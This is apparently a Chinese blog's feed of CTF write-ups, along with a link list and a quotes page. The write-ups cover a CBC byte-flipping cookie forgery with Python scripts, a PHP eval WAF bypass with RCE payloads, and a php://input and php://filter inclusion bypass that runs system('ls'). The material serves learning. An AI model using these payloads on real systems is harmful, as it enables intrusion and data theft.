class=&quot;user-icon&quot;&gt;&lt;/div&gt;</span><br><span class="line">                    &lt;div class=&quot;pass-icon&quot;&gt;&lt;/div&gt;</span><br><span class="line">                    &lt;form name=&quot;login-form&quot; class=&quot;login-form&quot; action=&quot;&quot; method=&quot;post&quot;&gt;</span><br><span class="line">                        &lt;div class=&quot;header&quot;&gt;</span><br><span class="line">                        &lt;h1&gt;Login Form&lt;/h1&gt;</span><br><span class="line">                        &lt;span&gt;Fill out the form below to login to my super awesome imaginary control panel.&lt;/span&gt;</span><br><span class="line">                        &lt;/div&gt;</span><br><span class="line">                        &lt;div class=&quot;content&quot;&gt;</span><br><span class="line">                        &lt;input name=&quot;username&quot; type=&quot;text&quot; class=&quot;input username&quot; value=&quot;Username&quot; onfocus=&quot;this.value=\&apos;\&apos;&quot; /&gt;</span><br><span class="line">                        &lt;input name=&quot;password&quot; type=&quot;password&quot; class=&quot;input password&quot; value=&quot;Password&quot; onfocus=&quot;this.value=\&apos;\&apos;&quot; /&gt;</span><br><span class="line">                        &lt;/div&gt;</span><br><span class="line">                        &lt;div class=&quot;footer&quot;&gt;</span><br><span class="line">                        &lt;input type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;Login&quot; class=&quot;button&quot; /&gt;</span><br><span class="line">                        &lt;/div&gt;</span><br><span class="line">                    &lt;/form&gt;</span><br><span class="line">                &lt;/div&gt;</span><br><span class="line">            &lt;/body&gt;&apos;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>关键代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">function check_login()&#123;</span><br><span class="line">    if(isset($_COOKIE[&apos;cipher&apos;]) &amp;&amp; isset($_COOKIE[&apos;iv&apos;]))</span><br><span class="line">&#123;</span><br><span class="line">//base64_decode解码</span><br><span class="line">        $cipher = base64_decode($_COOKIE[&apos;cipher&apos;]);</span><br><span class="line">        $iv = base64_decode($_COOKIE[&quot;iv&quot;]);</span><br><span class="line">        if($plain = openssl_decrypt($cipher, METHOD, SECRET_KEY, OPENSSL_RAW_DATA, $iv))</span><br><span class="line">&#123;</span><br><span class="line">            $info = unserialize($plain) or die(&quot;&lt;p&gt;base64_decode(&apos;&quot;.base64_encode($plain).&quot;&apos;) can&apos;t unserialize&lt;/p&gt;&quot;);</span><br><span class="line">            $_SESSION[&apos;username&apos;] = $info[&apos;username&apos;];</span><br><span class="line">        &#125;</span><br><span class="line">else</span><br><span class="line">&#123;</span><br><span class="line">            die(&quot;ERROR!&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>整体流程为：</p><p>判断是否是admin=&gt;生成IV=&gt;将输入序列化=&gt;加密并保存IV和cipher的base64编码值=&gt;base64解码=&gt;解密=&gt;若是admin=&gt;显示flag</p><p>通过发送更改之后的iv和cipher值能够改变最终反序列化的结果实现绕过。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$str=array(&apos;username&apos;=&gt;&apos;zdmin&apos;,&apos;password&apos;=&gt;&apos;aaaaa&apos;);</span><br><span class="line">echo serialize($str);</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">序列化的结果：</span><br><span class="line">a:2:&#123;s:8:&quot;username&quot;;s:5:&quot;zdmin&quot;;s:8:&quot;password&quot;;s:5:&quot;aaaaa&quot;;&#125;</span><br></pre></td></tr></table></figure><blockquote><p>分块：<br>a:2:{s:8:”userna<br>me”;s:5:”zdmin”;<br>s:8:”password”;s<br>:5:”aaaaa”;</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">抓包得到初始向量和密文的值：</span><br><span class="line">iv = eHhqTY7a%2FTLcVNva%2Blt3FQ%3D%3D</span><br><span class="line">cipher=hifeZ%2Fb9QH4F7fyx%2FIN8cbAkmVA%2FgyisOAmRVASFIAFeFe0gexxdGQreuy%2F2sSOyz0WZDJtjGstYpTM0oWUdXw%3D%3D</span><br></pre></td></tr></table></figure><p>通过以下脚本，更改第一块的密文值，使得在解密过程中，zdmin变为admin。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line"></span><br><span class="line">import base64</span><br><span class="line">import urllib</span><br><span class="line"></span><br><span class="line">iv_raw=&apos;eHhqTY7a%2FTLcVNva%2Blt3FQ%3D%3D&apos;  #这里填写第一次返回的iv值</span><br><span class="line">cipher_raw=&apos;hifeZ%2Fb9QH4F7fyx%2FIN8cbAkmVA%2FgyisOAmRVASFIAFeFe0gexxdGQreuy%2F2sSOyz0WZDJtjGstYpTM0oWUdXw%3D%3D&apos;  #这里填写第一次返回的cipher值</span><br><span class="line">print &quot;[*]原始iv和cipher&quot;</span><br><span class="line">print &quot;iv_raw:  &quot; + iv_raw</span><br><span class="line">print &quot;cipher_raw:  &quot; + cipher_raw</span><br><span class="line">print &quot;[*]对cipher解码，进行反转&quot;</span><br><span class="line">cipher = base64.b64decode(urllib.unquote(cipher_raw))</span><br><span class="line">#a:2:&#123;s:8:&quot;username&quot;;s:5:&quot;zdmin&quot;;s:8:&quot;password&quot;;s:5:&quot;12345&quot;&#125;</span><br><span class="line">#s:2:&#123;s:8:&quot;userna</span><br><span class="line">#me&quot;;s:5:&quot;zdmin&quot;;</span><br><span class="line">#s:8:&quot;password&quot;;s</span><br><span class="line">#:3:&quot;12345&quot;;&#125;</span><br><span class="line">xor_cipher = cipher[0:9] +  chr(ord(cipher[9]) ^ ord(&apos;z&apos;) ^ ord(&apos;a&apos;)) + cipher[10:]  #根据异或的原理，最终得到的</span><br><span class="line">xor_cipher=urllib.quote(base64.b64encode(xor_cipher))</span><br><span class="line">print &quot;反转后的cipher：&quot; + xor_cipher</span><br><span class="line"></span><br><span class="line"># cipher更改为hifeZ/b9QH4F9vyx/IN8cbAkmVA/gyisOAmRVASFIAFeFe0gexxdGQreuy/2sSOyz0WZDJtjGstYpTM0oWUdXw%3D%3D;</span><br></pre></td></tr></table></figure><p>在HTTP请求包中cookie设置iv和cipher。发现提示不能得到反序列化的结果，base64 decode后发现已经变为admin,但第一块密文的改变导致第一块的明文发生改变。</p><p>明文和第一块的密文保持不变，只能通过重新计算iv的值得到想要的明文。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line"></span><br><span class="line">import base64</span><br><span class="line">import urllib</span><br><span class="line"></span><br><span class="line">cipher = &apos;JCko+9LNNgp+8j7ld/oURm1lIjtzOjU6ImFkbWluIjtzOjg6InBhc3N3b3JkIjtzOjU6ImFhYWFhIjt9&apos;   #填写提交后所得的无法反序列化密文</span><br><span class="line">iv = &apos;eHhqTY7a%2FTLcVNva%2Blt3FQ%3D%3D&apos;                         #一开始提交的iv</span><br><span class="line"></span><br><span class="line">#cipher = urllib.unquote(cipher)</span><br><span class="line">cipher = base64.b64decode(cipher)</span><br><span class="line">iv = base64.b64decode(urllib.unquote(iv))</span><br><span class="line">newIv = &apos;&apos;</span><br><span class="line">right = &apos;a:2:&#123;s:8:&quot;userna&apos;                                      #被损坏前正确的明文</span><br><span class="line">for i in range(16):</span><br><span class="line">    newIv += chr(ord(right[i])^ord(iv[i])^ord(cipher[i]))       #这一步相当于把原来iv中不匹配的部分修改过来</span><br><span class="line">print urllib.quote(base64.b64encode(newIv))</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">得到最终的iv和cipher值：</span><br><span class="line">iv=PWtwjCdk8QCYhJBM6NMNMg%3D%3D;</span><br><span class="line">cipher=hifeZ/b9QH4F9vyx/IN8cbAkmVA/gyisOAmRVASFIAFeFe0gexxdGQreuy/2sSOyz0WZDJtjGstYpTM0oWUdXw%3D%3D</span><br></pre></td></tr></table></figure><p>重新发送HTTP包后返回flag</p><p>得到flag:SKCTF{CBC_wEB_cryptography_6646dfgdg6}</p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>这种web和Crypto结合的问题还是有难度的，逻辑上捋通就行了。</p><p>在理解的过程中，想到改变第二块对应位置的密文不行吗？思考之后发现，如果只是改变第一块的内容，能写脚本计算对应的iv值；若改变第二块的内容，则会导致第三块的密文出错，仍不能正常反序列化得到结果。（若强行使用这种方法，需要改变之后的所有块的密文，显然是更加麻烦和不易实现的）</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;题目中遇到了CBC字节翻转攻击，借此机会系统的学习一下。&lt;/p&gt;
&lt;p&gt;CBC字节翻转攻击的精髓在于损坏密文来改变明文。&lt;/p&gt;
&lt;h2 i
      
    
    </summary>
    
    
      <category term="web" scheme="https://xytk0x0.github.io/categories/web/"/>
    
      <category term="Crypto" scheme="https://xytk0x0.github.io/categories/Crypto/"/>
    
    
      <category term="web" scheme="https://xytk0x0.github.io/tags/web/"/>
    
      <category term="CTF" scheme="https://xytk0x0.github.io/tags/CTF/"/>
    
      <category term="wp" scheme="https://xytk0x0.github.io/tags/wp/"/>
    
      <category term="Crypto" scheme="https://xytk0x0.github.io/tags/Crypto/"/>
    
      <category term="CBC字节翻转攻击" scheme="https://xytk0x0.github.io/tags/CBC%E5%AD%97%E8%8A%82%E7%BF%BB%E8%BD%AC%E6%94%BB%E5%87%BB/"/>
    
  </entry>
  
  <entry>
    <title>【wp】[RoarCTF 2019]Easy Calc</title>
    <link href="https://xytk0x0.github.io/2019/10/18/%E3%80%90wp%E3%80%91-RoarCTF-2019-Easy-Calc/"/>
    <id>https://xytk0x0.github.io/2019/10/18/【wp】-RoarCTF-2019-Easy-Calc/</id>
    <published>2019-10-18T02:53:46.000Z</published>
    <updated>2019-10-20T23:34:07.716Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>代码审计、Bypass</p><p>比赛的时候稍微有点懵，我还是太菜了。</p><p>题目链接： <a href="https://buuoj.cn/challenges" target="_blank" rel="noopener">https://buuoj.cn/challenges</a></p><p>参考链接： </p><p>利用PHP的字符串解析特性Bypass： <a href="https://www.freebuf.com/articles/web/213359.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/web/213359.html</a></p><p>PHP去参数实现RCE：</p><p><a href="https://skysec.top/2019/03/29/PHP-Parametric-Function-RCE/#%E6%B3%95%E4%BA%94%EF%BC%9Adirname-amp-chdir" target="_blank" rel="noopener">https://skysec.top/2019/03/29/PHP-Parametric-Function-RCE/#%E6%B3%95%E4%BA%94%EF%BC%9Adirname-amp-chdir</a></p><p><a href="https://www.guildhab.top/?p=1024" target="_blank" rel="noopener">https://www.guildhab.top/?p=1024</a></p><hr><h1 id="RoarCTF-2019-Easy-Calc"><a href="#RoarCTF-2019-Easy-Calc" class="headerlink" title="RoarCTF-2019-Easy Calc"></a>RoarCTF-2019-Easy Calc</h1><p>发现js代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">    //对输入的特殊字符进行URL编码并以GET方式访问请求</span><br><span class="line">    $(&apos;#calc&apos;).submit(function()&#123;</span><br><span class="line">        $.ajax(&#123;</span><br><span class="line">            url:&quot;calc.php?num=&quot;+encodeURIComponent($(&quot;#content&quot;).val()),      </span><br><span class="line">            type:&apos;GET&apos;,</span><br><span class="line">            success:function(data)&#123;</span><br><span class="line">                $(&quot;#result&quot;).html(`&lt;div class=&quot;alert alert-success&quot;&gt;</span><br><span class="line">            &lt;strong&gt;答案:&lt;/strong&gt;$&#123;data&#125;</span><br><span class="line">            &lt;/div&gt;`);</span><br><span class="line">            &#125;,</span><br><span class="line">            error:function()&#123;</span><br><span class="line">                alert(&quot;这啥?算不来!&quot;);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;)</span><br><span class="line">        return false;</span><br><span class="line">    &#125;)</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>访问calc.php，发现对参数的过滤。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">error_reporting(0); </span><br><span class="line">if(!isset($_GET[&apos;num&apos;]))&#123; </span><br><span class="line">    show_source(__FILE__); </span><br><span class="line">&#125;else&#123; </span><br><span class="line">        $str = $_GET[&apos;num&apos;]; </span><br><span class="line">        $blacklist = [&apos; &apos;, &apos;\t&apos;, &apos;\r&apos;, &apos;\n&apos;,&apos;\&apos;&apos;, &apos;&quot;&apos;, &apos;`&apos;, &apos;\[&apos;, &apos;\]&apos;,&apos;\$&apos;,&apos;\\&apos;,&apos;\^&apos;]; </span><br><span class="line">        foreach ($blacklist as $blackitem) &#123; </span><br><span class="line">                if (preg_match(&apos;/&apos; . $blackitem . &apos;/m&apos;, $str)) &#123; </span><br><span class="line">                        die(&quot;what are you want to do?&quot;); </span><br><span class="line">                &#125; </span><br><span class="line">        &#125; </span><br><span class="line">        eval(&apos;echo &apos;.$str.&apos;;&apos;); </span><br><span class="line">&#125; </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>刚开始以为是SSTI，试了半天发现行不通，然后经测试发现不允许输入特殊字符和字母(会弹出：这啥？算不来)，只允许输入计算式。</p><p>calc.php?%20num=1;aaa 不会报错，即可以绕过WAF对字母的限制。</p><blockquote><p>%20num在WAF中是%20num，在server中是num，接下来绕过calc.php中的过滤。</p></blockquote><p>使用无参数的PHP函数(参照上面的链接)构造payload:</p><blockquote><p>calc.php?%20num=1;var_dump(scandir(dirname(dirname(dirname(getcwd())))))</p></blockquote><p>得到：</p><img src="/2019/10/18/【wp】-RoarCTF-2019-Easy-Calc/calc1.png" title="XYTK"><blockquote><p>payload:<br>改变file_get_contents(“/f1agg”)的形式绕过<br>calc.php?%20num=1;var_dump(file_get_contents(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103)))</p></blockquote>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;代码审计、Bypass&lt;/p&gt;
&lt;p&gt;比赛的时候稍微有点懵，我还是太菜了。&lt;/p&gt;
&lt;p&gt;题目链接： &lt;a href=&quot;https://bu
      
    
    </summary>
    
    
      <category term="web" scheme="https://xytk0x0.github.io/categories/web/"/>
    
    
      <category term="web" scheme="https://xytk0x0.github.io/tags/web/"/>
    
      <category term="CTF" scheme="https://xytk0x0.github.io/tags/CTF/"/>
    
      <category term="wp" scheme="https://xytk0x0.github.io/tags/wp/"/>
    
  </entry>
  
  <entry>
    <title>推荐一些大佬的博客(持续更新)</title>
    <link href="https://xytk0x0.github.io/2019/10/16/%E6%8E%A8%E8%8D%90%E4%B8%80%E4%BA%9B%E5%A4%A7%E4%BD%AC%E7%9A%84%E5%8D%9A%E5%AE%A2-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/"/>
    <id>https://xytk0x0.github.io/2019/10/16/推荐一些大佬的博客-持续更新/</id>
    <published>2019-10-16T06:35:26.000Z</published>
    <updated>2019-10-19T08:56:13.138Z</updated>
    
    <content type="html"><![CDATA[<h1 id="渗透测试："><a href="#渗透测试：" class="headerlink" title="渗透测试："></a>渗透测试：</h1><p>谢公子: <a href="https://blog.csdn.net/qq_36119192?t=1" target="_blank" rel="noopener">https://blog.csdn.net/qq_36119192?t=1</a></p><p>干货集中营: <a href="http://www.nmd5.com/test/index.php" target="_blank" rel="noopener">http://www.nmd5.com/test/index.php</a></p><p>Micro8: <a href="https://micro8.gitbook.io/micro8/" target="_blank" rel="noopener">https://micro8.gitbook.io/micro8/</a></p><h1 id="综合："><a href="#综合：" class="headerlink" title="综合："></a>综合：</h1><p>Paper: <a href="https://paper.seebug.org/" target="_blank" rel="noopener">https://paper.seebug.org/</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;渗透测试：&quot;&gt;&lt;a href=&quot;#渗透测试：&quot; class=&quot;headerlink&quot; title=&quot;渗透测试：&quot;&gt;&lt;/a&gt;渗透测试：&lt;/h1&gt;&lt;p&gt;谢公子: &lt;a href=&quot;https://blog.csdn.net/qq_36119192?t=1&quot; targe
      
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>【wp】攻防世界web进阶-web php include</title>
    <link href="https://xytk0x0.github.io/2019/10/13/%E3%80%90wp%E3%80%91%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E8%BF%9B%E9%98%B6-web-php-include/"/>
    <id>https://xytk0x0.github.io/2019/10/13/【wp】攻防世界web进阶-web-php-include/</id>
    <published>2019-10-13T06:14:29.000Z</published>
    <updated>2019-10-20T23:37:33.441Z</updated>
    
    <content type="html"><![CDATA[<h1 id="总述"><a href="#总述" class="headerlink" title="总述"></a>总述</h1><p>打开题目是一段PHP代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">  show_source(__FILE__);</span><br><span class="line">  echo $_GET[&apos;hello&apos;];</span><br><span class="line">  $page=$_GET[&apos;page&apos;];</span><br><span class="line">  while (strstr($page, &quot;php://&quot;)) &#123;</span><br><span class="line">      $page=str_replace(&quot;php://&quot;, &quot;&quot;, $page);</span><br><span class="line">  &#125;</span><br><span class="line">  include($page);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>猜测是绕过strstr( )函数，结合php伪协议进行命令执行和读取文件源代码</p><hr><h1 id="strstr-函数"><a href="#strstr-函数" class="headerlink" title="strstr()函数"></a>strstr()函数</h1><h2 id="定义和用法"><a href="#定义和用法" class="headerlink" title="定义和用法"></a>定义和用法</h2><p>strstr()函数搜索字符串在另一个字符串中是否存在，如果存在，则返回包括匹配字符串的剩余字符串，否则返回false。</p><p>该函数是二进制安全的。</p><p>该函数是区分大小写的。(stristr()函数可以进行不区分大小写的搜索)</p><h2 id="用法"><a href="#用法" class="headerlink" title="用法"></a>用法</h2><img src="/2019/10/13/【wp】攻防世界web进阶-web-php-include/strstr().jpg" title="XYTK"><hr><h1 id="PHP命名大小写敏感规则"><a href="#PHP命名大小写敏感规则" class="headerlink" title="PHP命名大小写敏感规则"></a>PHP命名大小写敏感规则</h1><h2 id="区分大小写"><a href="#区分大小写" class="headerlink" title="区分大小写"></a>区分大小写</h2><h3 id="变量名"><a href="#变量名" class="headerlink" title="变量名"></a>变量名</h3><p>所有变量均区分大小写，包括普通变量以 及$_GET,$_POST,$_REQUEST,$_COOKIE,$_SESSION,$GLOBALS,$_SERVER,$_FILES,$_ENV 等；</p><h3 id="常量名"><a href="#常量名" class="headerlink" title="常量名"></a>常量名</h3><p>使用define定义的常量是区分大小写的。</p><h3 id="数组索引-键名"><a href="#数组索引-键名" class="headerlink" title="数组索引(键名)"></a>数组索引(键名)</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$arr = array(&apos;one&apos;=&gt;&apos;first&apos;);</span><br><span class="line">echo $arr[&apos;one&apos;];    //输出&apos;first&apos;</span><br><span class="line">echo $arr[&apos;One&apos;];    //无输出并报错</span><br><span class="line">echo $Arr[&apos;one&apos;];    //上面讲过，变量名区分大小写，所以无输出并报错</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><h2 id="不区分大小写"><a href="#不区分大小写" class="headerlink" title="不区分大小写"></a>不区分大小写</h2><h3 id="函数名、方法名、类名"><a href="#函数名、方法名、类名" class="headerlink" title="函数名、方法名、类名"></a>函数名、方法名、类名</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class Test</span><br><span class="line">&#123;</span><br><span class="line">    static public function Ceshi()</span><br><span class="line">    &#123;</span><br><span class="line">        echo &apos;123&apos;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public funcion Dxx()</span><br><span class="line">    &#123;</span><br><span class="line">        echo &apos;321&apos;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$obj = new Test;</span><br><span class="line">$obj-&gt;Dxx();    //成功实例化Test类，并调用Dxx方法输出&apos;321&apos;</span><br><span class="line">$obj-&gt;dxx();    //成功实例化Test类，并调用Dxx方法输出&apos;321&apos;</span><br><span class="line">$obj = new test;</span><br><span class="line">$obj-&gt;Dxx();    //成功实例化Test类，并调用Dxx方法输出&apos;321&apos;</span><br><span class="line">$obj-&gt;dxx();    //成功实例化Test类，并调用Dxx方法输出&apos;321&apos;</span><br><span class="line"></span><br><span class="line">Test::Ceshi();    //输出&apos;123&apos;</span><br><span class="line">test::Ceshi();    //输出&apos;123&apos;</span><br><span class="line">Test::ceshi();    //输出&apos;123&apos;</span><br><span class="line">test::ceshi();    //输出&apos;123&apos;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><h3 id="魔术常量"><a href="#魔术常量" class="headerlink" title="魔术常量"></a>魔术常量</h3><p>__LINE__、__FILE__、__DIR__、__FUNCTION__、__CLASS__、__METHOD__、 __NAMESPACE__等都不区分大小写。</p><h3 id="NULL、TRUE、FALSE不区分大小写"><a href="#NULL、TRUE、FALSE不区分大小写" class="headerlink" title="NULL、TRUE、FALSE不区分大小写"></a>NULL、TRUE、FALSE不区分大小写</h3><h3 id="强制类型转换"><a href="#强制类型转换" class="headerlink" title="强制类型转换"></a>强制类型转换</h3><p>(int)，(integer) – 转换成整型<br>(bool)，(boolean) – 转换成布尔型<br>(float)，(double)，(real) – 转换成浮点型<br>(string) – 转换成字符串<br>(array) – 转换成数组<br>(object) – 转换成对象  </p><hr><h1 id="php"><a href="#php" class="headerlink" title="php://"></a>php://</h1><p>在本题中，可以使用大小写的方式绕过对php://的检测</p><h2 id="php-input"><a href="#php-input" class="headerlink" title="php://input"></a>php://input</h2><p>将以post方式发送的数据执行</p><blockquote><p>payload:<br>?page=pHp://input<br>&lt;?php system(‘ls’)?&gt;</p></blockquote><p>得到：</p><img src="/2019/10/13/【wp】攻防世界web进阶-web-php-include/ls_res.jpg" title="XYTK"><h2 id="php-filter"><a href="#php-filter" class="headerlink" title="php://filter"></a>php://filter</h2><blockquote><p>payload:<br>?page=pHp://filter/read=convert.base64-encode/resource=fl4gisisish3r3.php</p></blockquote><img src="/2019/10/13/【wp】攻防世界web进阶-web-php-include/flag_base64.jpg" title="XYTK"><p>进行base64解码即可得到flag</p><img src="/2019/10/13/【wp】攻防世界web进阶-web-php-include/flag.jpg" title="XYTK"><hr><h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><p>PHP命名大小写敏感规则：<a href="https://www.cnblogs.com/daipianpian/p/5721377.html" target="_blank" rel="noopener">https://www.cnblogs.com/daipianpian/p/5721377.html</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;总述&quot;&gt;&lt;a href=&quot;#总述&quot; class=&quot;headerlink&quot; title=&quot;总述&quot;&gt;&lt;/a&gt;总述&lt;/h1&gt;&lt;p&gt;打开题目是一段PHP代码：&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class
      
    
    </summary>
    
    
      <category term="web" scheme="https://xytk0x0.github.io/categories/web/"/>
    
    
      <category term="web" scheme="https://xytk0x0.github.io/tags/web/"/>
    
      <category term="CTF" scheme="https://xytk0x0.github.io/tags/CTF/"/>
    
      <category term="wp" scheme="https://xytk0x0.github.io/tags/wp/"/>
    
      <category term="文件包含" scheme="https://xytk0x0.github.io/tags/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/"/>
    
      <category term="攻防世界" scheme="https://xytk0x0.github.io/tags/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C/"/>
    
  </entry>
  
  <entry>
    <title>几句话</title>
    <link href="https://xytk0x0.github.io/2019/10/08/%E5%87%A0%E5%8F%A5%E8%AF%9D/"/>
    <id>https://xytk0x0.github.io/2019/10/08/几句话/</id>
    <published>2019-10-08T05:33:00.484Z</published>
    <updated>2019-10-27T06:36:43.830Z</updated>
    
    <content type="html"><![CDATA[<h1 id="差不多得了"><a href="#差不多得了" class="headerlink" title="差不多得了"></a>差不多得了</h1><blockquote><p>这世界本就没有任何一句话，可以让你醍醐灌顶。真正让你醍醐灌顶的，只能是一段经历。而那句话，只是火药仓库内划燃的一根火柴。——–刘震云《一句顶一万句》</p></blockquote><blockquote><p>楼下一个男人病得要死，那间隔壁的一家唱着留声机，对面是弄孩子。楼上有两人狂笑；还有打牌声。河中的船上有女人哭着她死去的母亲。人类的悲欢并不相通，我只觉得他们吵闹。——–鲁迅</p></blockquote><hr><h1 id="网上看的"><a href="#网上看的" class="headerlink" title="网上看的"></a>网上看的</h1><blockquote><p>我也有段日子过的不顺心。那时候就常想，如果有人见到我这样在烂泥地里打滚，爬都爬不起来的模样，还能爱着我就好了。但我也不知道会不会有这样的人，我也不敢给别人看。——–《天官赐福》</p></blockquote><blockquote><p>有人尖刻的嘲讽你，你马上尖酸的回敬他。有人毫无理由的看不起你，你马上轻蔑的鄙视他。有人在你面前大肆炫耀，你马上加倍证明你更厉害。有人对你冷漠，你马上对他冷淡疏远。看，你讨厌的那些人，轻易就把你变成你自己最讨厌的那种样子。——–扎西拉姆·多多</p></blockquote><blockquote><p>放平心态，偷偷厉害。</p></blockquote><blockquote><p>我本可以忍受黑暗，如果我不曾见过太阳。</p></blockquote><hr><h1 id="自己说的"><a href="#自己说的" class="headerlink" title="自己说的"></a>自己说的</h1><blockquote><p>我**，这**QQ的收藏夹也太**恐怖了吧，**根本不敢往下看。——–2019/10/9</p></blockquote><blockquote><p>真的是生死有命，富贵在天。</p></blockquote><blockquote><p>你一定要觉得人间值得啊，我本该当面和你说的。</p></blockquote><blockquote><p>半山腰人太 ** 多了，我要去山顶看看。</p></blockquote><img src="/2019/10/08/几句话/0.jpg" title="XYTK">]]></content>
    
    <summary type="html">
    
      
      
